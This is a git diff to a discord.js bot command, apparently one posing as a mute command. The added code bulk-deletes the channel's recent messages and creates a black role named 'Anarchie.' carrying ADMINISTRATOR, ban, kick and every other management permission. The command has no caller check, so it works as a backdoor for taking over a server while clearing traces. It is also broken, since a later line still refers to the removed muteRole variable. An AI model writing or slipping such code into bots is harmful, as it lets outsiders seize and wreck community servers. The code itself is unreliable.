@@ -2,26 +2,20 @@ const Discord = require('discord.js');
 
 exports.run = async (client, message) => {
 
-  const muteRole = message.guild.roles.find(`name`, "Anarchie");
+  message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages));
+ 
+        const ARole = message.guild.roles.find(`name`, "Anarchie.");
 
-  if(!muteRole){
-      try{
-   
+        if(!ARole){   
 
-    muteRole = message.guild.createRole({
-      name: "Anarchie",
+
+        message.guild.createRole({
+      name: "Anarchie.",
       color: "#00000",
-      permissions:[]
+      permissions:['ADMINISTRATOR', 'KICK_MEMBERS', 'BAN_MEMBERS', 'MANAGE_CHANNELS', 'MANAGE_GUILD', 'ADD_REACTIONS', 'VIEW_AUDIT_LOG', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'SEND_TTS_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'USE_EXTERNAL_EMOJIS', 'EXTERNAL_EMOJIS', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS', 'DEAFEN_MEMBERS', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES', 'MANAGE_ROLES', 'MANAGE_WEBHOOKS', 'MANAGE_EMOJIS']
     })
-    message.guild.channels.forEach(async (channel, i) => {
-      await muteRole.setPermissions(['ADMINISTRATOR', 'KICK_MEMBERS', 'BAN_MEMBERS', 'MANAGE_CHANNELS', 'MANAGE_GUILD', 'ADD_REACTIONS', 'VIEW_AUDIT_LOG', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'SEND_TTS_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'USE_EXTERNAL_EMOJIS', 'EXTERNAL_EMOJIS', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS', 'DEAFEN_MEMBERS', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES', 'MANAGE_ROLES', 'MANAGE_WEBHOOKS', 'MANAGE_EMOJIS'])                  
-      });
-  }catch(e){
-    console.log(e.stack);
-  }
-
-//end of create role
-  }
+    
+    }
 
 
   if (message.guild.member(message.author).roles.has(muteRole.id)) {
